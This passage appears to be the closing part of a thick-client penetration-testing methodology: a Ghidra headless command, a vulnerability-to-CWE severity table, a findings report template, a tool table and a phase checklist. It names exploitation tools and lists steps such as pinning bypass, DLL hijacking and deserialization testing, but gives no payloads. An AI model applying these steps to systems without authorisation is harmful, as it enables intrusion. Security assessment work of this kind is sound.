# Run headless analysis:
analyzeHeadless /path/to/project ProjectName -import application.exe -postScript FindVulnerabilities.java
```

---

## PHASE 10: REPORTING

### Severity Classification for Thick Client Vulnerabilities

| Vulnerability | Typical Severity | CWE |
|--------------|-----------------|-----|
| Hardcoded credentials | Critical | CWE-798 |
| Insecure deserialization → RCE | Critical | CWE-502 |
| DLL hijacking → privilege escalation | High | CWE-427 |
| Missing certificate validation | High | CWE-295 |
| Credentials stored in plaintext | High | CWE-312 |
| Sensitive data in memory post-logout | Medium | CWE-316 |
| Unquoted service path | Medium | CWE-428 |
| Missing code signing | Medium | CWE-353 |
| Debug features in production | Medium | CWE-489 |
| Cleartext transmission of sensitive data | High | CWE-319 |
| Insecure update mechanism | High | CWE-494 |
| JNDI injection | Critical | CWE-917 |
| Electron nodeIntegration enabled | Critical | CWE-94 |
| Weak cryptography | Medium | CWE-327 |
| Sensitive data in logs | Medium | CWE-532 |
| Missing anti-tampering / integrity checks | Low-Medium | CWE-354 |

### Report Template

```markdown
## Finding: [Vulnerability Title]

**Category:** [Binary Analysis / Network / Local Storage / Runtime / Framework-Specific / Priv Esc]
**Severity:** Critical / High / Medium / Low
**CVSS 3.1 Score:** X.X
**CWE:** CWE-XXX — [CWE Name]

### Description
[Clear description of the vulnerability, including the specific component affected]

### Affected Component
- **Binary/Module:** [filename.exe / module.dll]
- **Function/Class:** [Namespace.Class.Method]
- **Offset/Address:** [0xABCD1234 if applicable]

### Reproduction Steps
1. [Tool used: dnSpy / x64dbg / Burp / Procmon / etc.]
2. [Specific action taken]
3. [Observed result]

### Impact
[Business impact: what can an attacker achieve with this vulnerability]
[Access prerequisites: local user, network access, physical access]

### Evidence
- [Screenshots of decompiled code, memory dumps, Procmon captures]
- [Network traffic captures, decrypted communications]
- [Registry entries, configuration files]

### Remediation
- [Code-level fix: specific API/method to use instead]
- [Architecture fix: design changes needed]
- [Configuration fix: settings to change]

### References
- [CWE reference link]
- [Framework-specific security guide]
- [Vendor advisory if applicable]
```

### Tool Summary Table

| Tool | Purpose | Platform | Usage Phase |
|------|---------|----------|-------------|
| Detect It Easy (DIE) | Binary identification, packer detection | Win/Lin/Mac | Phase 1 |
| Ghidra | Native binary reverse engineering | Win/Lin/Mac | Phase 2, 9 |
| dnSpy | .NET decompilation and debugging | Windows | Phase 2, 7 |
| ILSpy / ilspycmd | .NET decompilation (CLI) | Win/Lin/Mac | Phase 2, 7 |
| JD-GUI / CFR / Procyon | Java decompilation | Win/Lin/Mac | Phase 2, 8 |
| JADX | Java/Android decompilation | Win/Lin/Mac | Phase 2, 8 |
| Burp Suite | HTTP(S) traffic interception | Win/Lin/Mac | Phase 3 |
| Wireshark / tshark | Network protocol analysis | Win/Lin/Mac | Phase 3 |
| Proxifier | Force application through proxy | Win/Mac | Phase 3 |
| mitmproxy | Transparent HTTPS proxy | Win/Lin/Mac | Phase 3 |
| x64dbg / WinDbg | Windows debugger | Windows | Phase 5 |
| GDB / LLDB | Linux/macOS debugger | Linux/Mac | Phase 5 |
| Frida | Dynamic instrumentation and hooking | Win/Lin/Mac | Phase 5 |
| API Monitor | Windows API call monitoring | Windows | Phase 5 |
| Process Monitor (Procmon) | File/registry/network activity monitoring | Windows | Phase 1, 5, 9 |
| Process Explorer | Process and handle analysis | Windows | Phase 5 |
| de4dot | .NET deobfuscation | Windows | Phase 7 |
| ysoserial / ysoserial.net | Deserialization payload generation | Cross-platform | Phase 7, 8 |
| marshalsec | JNDI exploitation server | Cross-platform | Phase 8 |
| rmg (Remote Method Guesser) | Java RMI enumeration and exploitation | Cross-platform | Phase 8 |
| Beanshooter | JMX exploitation | Cross-platform | Phase 8 |
| FLOSS | Obfuscated string extraction | Win/Lin/Mac | Phase 2 |
| accesschk | Windows permission analysis | Windows | Phase 9 |

---

## WORKFLOW EXECUTION CHECKLIST

- [ ] Phase 1: Application profiled, framework identified, filesystem footprint mapped
- [ ] Phase 2: Binary decompiled, strings extracted, secrets searched, update mechanism reviewed
- [ ] Phase 3: Traffic intercepted, cert pinning bypassed, all APIs mapped
- [ ] Phase 4: Local storage audited (config, registry, SQLite, credentials, logs, IPC)
- [ ] Phase 5: Debugger attached, memory analyzed, functions hooked, runtime behavior mapped
- [ ] Phase 6 (if Electron): Node integration, context isolation, preload scripts, DevTools assessed
- [ ] Phase 7 (if .NET): Assembly decompiled, deserialization sinks tested, binary patching attempted
- [ ] Phase 8 (if Java): JAR decompiled, deserialization tested, JNDI/RMI/JMX assessed
- [ ] Phase 9: DLL hijacking, unquoted paths, writable dirs, update abuse, named pipes tested
- [ ] Phase 10: Report generated with CWE mapping, tool evidence, and remediation guidance
